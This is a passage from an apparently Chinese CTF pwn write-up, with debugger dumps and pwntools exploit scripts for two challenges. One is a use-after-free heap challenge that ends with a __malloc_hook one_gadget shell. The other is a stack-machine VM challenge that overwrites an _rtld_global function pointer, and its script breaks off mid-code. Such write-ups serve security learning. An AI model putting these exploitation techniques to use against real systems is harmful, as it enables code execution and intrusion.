class="line">0x603370:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>往上面看发现0x0000000001985c20为一个堆地址，其heap[0]位置的指针指向存放student’s name地址的地址，因此，我们可以通过UAF将堆申请到0x603280附件（正好有0x7f可以利用），然后修改0x0001985c20为一个存放read_got的地址，可以通过change_password实现。</p><p>效果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x6032e0-0x70</span><br><span class="line">0x603270:0x00000000000000000x0000000000000000</span><br><span class="line">0x603280 &lt;stderr&gt;:0x00007fa9e91f75400x00007fa9e91f7620</span><br><span class="line">0x603290:0x00000000000000000x0000000000000000</span><br><span class="line">0x6032a0:0x00000000006033000x0000000000000000</span><br><span class="line">0x6032b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6032c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6032d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6032e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6032f0:0x00000a00000000000x0000000000000000</span><br><span class="line">0x603300:0x0000000000602f380x4141414141414100</span><br><span class="line">0x603310:0x41414141414141410x4141414141414141</span><br><span class="line">0x603320:0x41414141414141410x4141414141414141</span><br><span class="line">0x603330:0x41414141414141410x4141414141414141</span><br><span class="line">0x603340:0x41414141414141410x4141414141414141</span><br><span class="line">0x603350:0x000000000000000a0x0000000000000021</span><br><span class="line">pwndbg&gt; telescope 0x0000000000602f38</span><br><span class="line">00:0000│   0x602f38 —▸ 0x7fa9e8f29310 (read) ◂— cmp    dword ptr [rip + 0x2d2429], 0</span><br><span class="line">01:0008│   0x602f40 —▸ 0x7fa9e8f77b50 (__strncmp_sse42) ◂— test   rdx, rdx</span><br><span class="line">02:0010│   0x602f48 —▸ 0x7fa9e8e52750 (__libc_start_main) ◂— push   r14</span><br><span class="line">03:0018│   0x602f50 —▸ 0x7fa9e8e6c290 (__cxa_atexit) ◂— push   r12</span><br></pre></td></tr></table></figure><p>leak之后利用uaf打malloc_hook，拿shell。<br>对了，add功能是通过edit info时修改name时的new实现的，dele功能是通过析构实现的。</p><p>ruan师傅的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">student</span>(<span class="params">sno</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;please:&quot;</span>)</span><br><span class="line">p.sendline(sno)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;grade(0~100):&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;grade:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">1234</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">    p=remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=process(<span class="string">&quot;./pwn4&quot;</span>)</span><br><span class="line">name_addr = <span class="number">0x00000000006032E0</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;p455w0rd&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x70</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(name_addr+<span class="number">0x10</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">student(<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(name_addr-<span class="number">0x5b</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">student(<span class="string">&quot;A&quot;</span>*<span class="number">0x60</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">0x0000000000602F38</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0xb</span>+p64(name_addr+<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">student(payload.ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;STUDENT: &quot;</span>)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-libc.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">student(<span class="string">&quot;shabi&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(name_addr+<span class="number">0x30</span>)*<span class="number">12</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(name_addr+<span class="number">0x10</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">student(<span class="string">&quot;shabi&quot;</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]-<span class="number">0x23</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">student(p64(name_addr+<span class="number">0x30</span>)*<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">one = <span class="number">0xf1207</span>+libc.address</span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0xb</span>+p64(<span class="number">0</span>)+p64(one)</span><br><span class="line">student(payload.ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(name_addr+<span class="number">0x30</span>)*<span class="number">12</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(name_addr) + p64(<span class="number">0</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">main(args[<span class="string">&#x27;REMOTE&#x27;</span>])</span><br></pre></td></tr></table></figure><p>ruan师傅nb！！</p><h4 id="stackmachine"><a href="#stackmachine" class="headerlink" title="stackmachine"></a>stackmachine</h4><p>一道vm类型的题目，除了canary其他保护全开。<br>程序首先初始化了sp,pc,stack,data,code段，之后输入data和code，然后run(常规的VM格式)。<br>先来看下初始化的情况把：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x1c48000</span><br><span class="line">0x1c48000:0x00000000000000000x0000000000000051</span><br><span class="line">0x1c48010:0x00000000000000000x0000000000000800  //pc &amp; sp</span><br><span class="line">0x1c48020:0x0000000001c480600x0000000000001000  //satck &amp; stack size</span><br><span class="line">0x1c48030:0x0000000001c490700x0000000000001000  //data  &amp; data size</span><br><span class="line">0x1c48040:0x0000000001c4a0800x0000000000001000  //code &amp; code size</span><br></pre></td></tr></table></figure><p>接下来就是逆指令了，我只把有用到的指令代码显示了出来：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">      <span class="keyword">if</span> ( vm-&gt;_sp &lt;= (<span class="type">unsigned</span> __int64)(vm-&gt;stack_sz - <span class="number">8</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_QWORD *)(<span class="number">8</span> * ((<span class="type">unsigned</span> __int64)vm-&gt;_sp &gt;&gt; <span class="number">3</span>) + vm-&gt;<span class="built_in">stack</span>) = *(_QWORD *)(<span class="number">8LL</span>* (*(_QWORD *)(vm-&gt;<span class="built_in">stack</span>+<span class="number">8</span> *((<span class="type">unsigned</span> __int64)vm-&gt;_sp &gt;&gt; <span class="number">3</span>)) &gt;&gt; <span class="number">3</span>)+ vm-&gt;data);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">      <span class="keyword">if</span> ( vm-&gt;_sp &lt;= (<span class="type">unsigned</span> __int64)(vm-&gt;stack_sz - <span class="number">16</span>) )<span class="comment">// stack-&gt;data</span></span><br><span class="line">      &#123;</span><br><span class="line">        *(_QWORD *)(vm-&gt;data + <span class="number">8LL</span> * (*(_QWORD *)(vm-&gt;<span class="built_in">stack</span> + <span class="number">8</span> * ((<span class="type">unsigned</span> __int64)vm-&gt;_sp &gt;&gt; <span class="number">3</span>)) &gt;&gt; <span class="number">3</span>)) = *(_QWORD *)(vm-&gt;<span class="built_in">stack</span> + <span class="number">8</span> * (((<span class="type">unsigned</span> __int64)vm-&gt;_sp &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>));</span><br><span class="line">        vm-&gt;_sp += <span class="number">0x10</span>LL;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">      <span class="keyword">if</span> ( vm-&gt;_sp &lt;= (<span class="type">unsigned</span> __int64)(vm-&gt;stack_sz - <span class="number">16</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v2 = *(_QWORD *)(vm-&gt;<span class="built_in">stack</span> + <span class="number">8</span> * ((<span class="type">unsigned</span> __int64)vm-&gt;_sp &gt;&gt; <span class="number">3</span>))</span><br><span class="line">           + *(_QWORD *)(vm-&gt;<span class="built_in">stack</span> + <span class="number">8</span> * (((<span class="type">unsigned</span> __int64)vm-&gt;_sp &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>));</span><br><span class="line">        vm-&gt;_sp += <span class="number">8LL</span>;</span><br><span class="line">        *(_QWORD *)(<span class="number">8</span> * ((<span class="type">unsigned</span> __int64)vm-&gt;_sp &gt;&gt; <span class="number">3</span>) + vm-&gt;<span class="built_in">stack</span>) = v2;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0xE</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( vm-&gt;_sp &gt; <span class="number">7uLL</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        vm-&gt;_sp -= <span class="number">8LL</span>;</span><br><span class="line">        *(_QWORD *)(<span class="number">8</span> * ((<span class="type">unsigned</span> __int64)vm-&gt;_sp &gt;&gt; <span class="number">3</span>) + vm-&gt;<span class="built_in">stack</span>) = *(_QWORD *)(vm-&gt;code + vm-&gt;_pc + <span class="number">1</span>);</span><br><span class="line">        vm-&gt;_pc += <span class="number">8LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>解释一下<br>0xe：将code段里数据放入stack段中,pc+&#x3D;8（相当于push）。<br>0x1：将以data为基地址以stack为偏移的地址的内容放入stack中。<br>0x2：将stack顶的数据放入以data为基地址，以stack顶的后一个的数据为偏移的地址处。（由于stack的内容可控，因此存在越界写）。<br>0x3：将stack里的两数相加并存入栈顶。</p><p>解体思路：<br>1.通过观察初始的状态可以发现：data_ptr&#x3D;0x01c49070,和该指针存在的结构体的位置：0x1c48030偏移为-0x1040，因此我们可以再开始时将stack中填入puts_got+offset(0x10000000000000000-0x1040),之后再执行2操作即可修改data_ptr为puts_got。</p><p>2.由于data_ptr被修改为puts_got,因此我们在stack里放入1作为偏移，再执行1操作即可将Libc里的地址写入stack里。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x807000</span><br><span class="line">0x807000:0x00000000000000000x0000000000000051</span><br><span class="line">0x807010:0x000000000000001c0x00000000000007f8</span><br><span class="line">0x807020:0x00000000008070600x0000000000001000</span><br><span class="line">0x807030:0x0000000000601fa00x0000000000001000</span><br><span class="line">0x807040:0x00000000008090800x0000000000001000</span><br><span class="line">0x807050:0x00000000000000000x0000000000001011</span><br><span class="line">0x807060:0x00000000000000000x0000000000000000</span><br><span class="line">0x807070:0x00000000000000000x0000000000000000</span><br><span class="line">0x807080:0x00000000000000000x0000000000000000</span><br><span class="line">0x807090:0x00000000000000000x0000000000000000</span><br><span class="line">pwndbg&gt; telescope 0x0000000000807060+0x7f8</span><br><span class="line">00:0000│ rdx  0x807858 —▸ 0x7efdc21586a0 (puts) ◂— push   r12</span><br></pre></td></tr></table></figure><p>3.之后我们通过+运算将其改为one_gadget，然后再通过步骤2在stack里写入一个libc的地址，这个地址将作为后面的offset。</p><p>由于题目保护无法改写got表，ruan师傅教我了个新姿势：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────[ DISASM ]─────────────────────────────────────────</span><br><span class="line">   0x7f118c176b24 &lt;_dl_fini+52&gt;     lea    rcx, [rip + 0x215515] &lt;0x7f118c38c040&gt;</span><br><span class="line">   0x7f118c176b2b &lt;_dl_fini+59&gt;     shl    rax, 4</span><br><span class="line">   0x7f118c176b2f &lt;_dl_fini+63&gt;     lea    r12, [rcx + rax - 0x88]</span><br><span class="line">   0x7f118c176b37 &lt;_dl_fini+71&gt;     jmp    _dl_fini+119 &lt;_dl_fini+119&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f118c176b67 &lt;_dl_fini+119&gt;    lea    rdi, [rip + 0x215dda] &lt;0x7f118c38c948&gt;</span><br><span class="line"> ► 0x7f118c176b6e &lt;_dl_fini+126&gt;    call   qword ptr [rip + 0x2163d4] &lt;rtld_lock_default_lock_recursive&gt;</span><br><span class="line">        rdi: 0x7f118c38c948 (_rtld_global+2312) ◂— 0x0</span><br><span class="line">        rsi: 0x0</span><br><span class="line">        rdx: 0x7f118c176af0 (_dl_fini) ◂— push   rbp</span><br><span class="line">        rcx: 0x7f118c38c040 (_rtld_global) —▸ 0x7f118c38d168 ◂— 0x0</span><br><span class="line"></span><br><span class="line">   0x7f118c176b74 &lt;_dl_fini+132&gt;    mov    ecx, dword ptr [r12]</span><br><span class="line">   0x7f118c176b78 &lt;_dl_fini+136&gt;    test   ecx, ecx</span><br><span class="line">   0x7f118c176b7a &lt;_dl_fini+138&gt;    je     _dl_fini+80 &lt;_dl_fini+80&gt;</span><br><span class="line"></span><br><span class="line">   0x7f118c176b7c &lt;_dl_fini+140&gt;    mov    rax, qword ptr [r12 - 8]</span><br><span class="line">   0x7f118c176b81 &lt;_dl_fini+145&gt;    movzx  edx, byte ptr [rax + 0x315]</span><br><span class="line">─────────────────────────────────────────[ STACK ]─────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7ffe200d3a80 —▸ 0x7f118c161620 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">01:0008│      0x7ffe200d3a88 ◂— 0x1</span><br><span class="line">02:0010│      0x7ffe200d3a90 —▸ 0x7f118c1616a3 (_IO_2_1_stdout_+131) ◂— 0x162780000000000a /* &#x27;\n&#x27; */</span><br><span class="line">03:0018│      0x7ffe200d3a98 —▸ 0x7ffe200d3c30 ◂— 0x1</span><br><span class="line">04:0020│      0x7ffe200d3aa0 ◂— 0x0</span><br><span class="line">05:0028│      0x7ffe200d3aa8 —▸ 0x7f118be16419 (_IO_do_write+121) ◂— mov    r13, rax</span><br><span class="line">06:0030│      0x7ffe200d3ab0 —▸ 0x7ffe200d3c30 ◂— 0x1</span><br><span class="line">07:0038│      0x7ffe200d3ab8 —▸ 0x7f118c161620 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">───────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────</span><br><span class="line"> ► f 0     7f118c176b6e _dl_fini+126</span><br><span class="line">   f 1     7f118bdd6008 __run_exit_handlers+232</span><br><span class="line">   f 2     7f118bdd6055</span><br><span class="line">   f 3     7f118bdbc847 __libc_start_main+247</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; telescope 0x7f118c176b74+0x2163d4</span><br><span class="line">00:0000│   0x7f118c38cf48 (_rtld_global+3848) —▸ 0x7f118c166c90 (rtld_lock_default_lock_recursive) ◂— add    dword ptr [rdi + 4], 1</span><br><span class="line">01:0008│   0x7f118c38cf50 (_rtld_global+3856) —▸ 0x7f118c166ca0 (rtld_lock_default_unlock_recursive) ◂— sub    dword ptr [rdi + 4], 1</span><br><span class="line">02:0010│   0x7f118c38cf58 (_rtld_global+3864) —▸ 0x7f118c17a0e0 (_dl_make_stack_executable) ◂— push   rbp</span><br><span class="line">03:0018│   0x7f118c38cf60 (_rtld_global+3872) ◂— 0x6</span><br><span class="line">04:0020│   0x7f118c38cf68 (_rtld_global+3880) ◂— 0x1</span><br><span class="line">05:0028│   0x7f118c38cf70 (_rtld_global+3888) —▸ 0x7f118c3708f8 ◂— 0x40 /* &#x27;@&#x27; */</span><br></pre></td></tr></table></figure><p>在执行exit函数时，一直步入进去看到即将call的位置是rtld_lock_default_lock_recursive：</p><p>0x7f118c38cf48 (_rtld_global+3848) —▸ 0x7f118c166c90 (rtld_lock_default_lock_recursive)<br>这种和got表的结构类似，因此我们只要改0x7f118c38cf48 (_rtld_global+3848)指向one_gadget即可拿shell，但这个地址是lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so里的地址，虽然本地是和libc基地址的偏移固定，但远程往往是不固定的，相差0x1000的整数倍，得通过爆破解决。</p><p>4.本地既然和libc偏移固定，就会和libc里的puts偏移固定，而0x0000000000601fa0又是一个固定的地址，因此只要通过’+’运算构造地址为0x7f118c38cf48 (_rtld_global+3848)-0x0000000000601fa0，最后执行2操作即可。</p><p>构造结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x0000000000e10060+0x7f0</span><br><span class="line">00:0000│   0xe10850 ◂— 0x7f118bd8afa8   //offset</span><br><span class="line">01:0008│   0xe10858 —▸ 0x7f118be8d207 (exec_comm+2263)  //one_gadget</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port = <span class="number">123</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p=remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=process(<span class="string">&quot;./StackMachine&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">one = <span class="number">0xf1207</span></span><br><span class="line">offset=one-<span class="number">0x06f6a0</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;stack size &gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;data size &gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;initial data &gt;&quot;</span>)</span><br><span 